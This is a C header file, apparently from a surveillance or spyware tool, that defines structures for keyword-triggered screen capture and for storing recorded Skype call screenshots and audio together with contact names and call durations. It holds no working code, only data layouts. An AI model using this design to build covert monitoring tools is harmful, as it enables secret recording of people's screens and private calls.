/********************************************************************
 * Filename:
 *     T5Screen.h
 * 
 * Author:
 *     xyz
 *
 * Time:
 *     2010/7/25   09:15
 * 
 * Note:
 *     
 *
 */	
#ifndef _TJ_T5_XQT_SCREEN_H_
#define _TJ_T5_XQT_SCREEN_H_

#define		CAPTURE_VERSION				0x00000001
#define		GZIP						(1)
#define		PRINT_SCREEN_MAGIC			0xFE801972
#define		KEYPROCESSWND				0x100
#define		KEYTITLEWINDOW				0x200
#define		FULLSCREEN					0x400

#define		THE_SAME_WINDOW(_LAST_WND)	\
	((_LAST_WND) == GetForegroundWindow())

#pragma pack(push)
#pragma pack(1)

//
// 截取参数结构
//
typedef struct _CAPTURE_CONFIG
{
	DWORD		dwSize;						// 结构体大小
	BOOL		bCapWindow;					// 是否捕获窗口
	DWORD		dwWindowInterval;			// 窗口捕获时间间隔,以秒为单位
	DWORD		dwKeyListOffset;            // 窗口标题关键字列表在头后的偏移量，内容以英文;分隔，
	DWORD		dwKeyListLength;            // 窗口标题关键字长度，不包含截止符，UNICODE编码的长度
	PWCHAR		lpwzKeyList;               // 此指针生成此结构时，请填NULL，功能模块得到数据后，自行修改
	DWORD		dwProcessListOffset;        // 删除文件的类型在列表头后的偏移量
	DWORD		dwProcessListLength;        // 删除文件的类型长度，不包含截止符，UNICODE编码的长度
	PWCHAR		lpwzProcessList;           // 此指针生成此结构时，请填NULL，功能模块得到数据后，自行修改
} CAPTURE_CONFIG, *PCAPTURE_CONFIG;

//
// 保存文件的头部
//
typedef struct _CAPTURE_FILE_HEADER
{
	DWORD		dwMagicNumber;			// 魔术数
	DWORD		dwPrintType;
	BYTE		bUnUsed[16];
	WCHAR		wzProcessName[64];		// 截取窗口的进程名
	FILETIME	ftSavetime;				// 截取时间
    
} CAPTURE_FILE_HEADER, *PCAPTURE_FILE_HEADER;

// Skype 音视频插件数据结构
// 视频截图与音频文件合并为一个
//
// +-------------------+-----------------------+----------+-----------------------+----------
// | SKYPE_FILE_HEADER | SKYPE_SUB_FILE_HEADER | 文件内容 | SKYPE_SUB_FILE_HEADER | 文件内容
// +-------------------+-----------------------+----------+-----------------------+----------

typedef struct _SKYPE_FILE_HEADER
{
	DWORD		dwMagicNumber;			// 0xFF14FF14
	WCHAR		wzSaveTime[256];
	DWORD		dwDuraiton;				// 通话时长
	WCHAR		wzContract[256];		// 联系人
} SKYPE_FILE_HEADER, *PSKYPE_FILE_HEADER;

typedef struct _SKYPE_SUB_FILE_HEADER
{
	DWORD		dwFileType;				// 0 - 图片 1 - 音频
	DWORD		dwFileSize;				// 文件大小
	WCHAR		wzFileName[256];		// 文件名
}SKYPE_SUB_FILE_HEADER, *PSKYPE_SUB_FILE_HEADER;

#pragma pack(pop)

#endif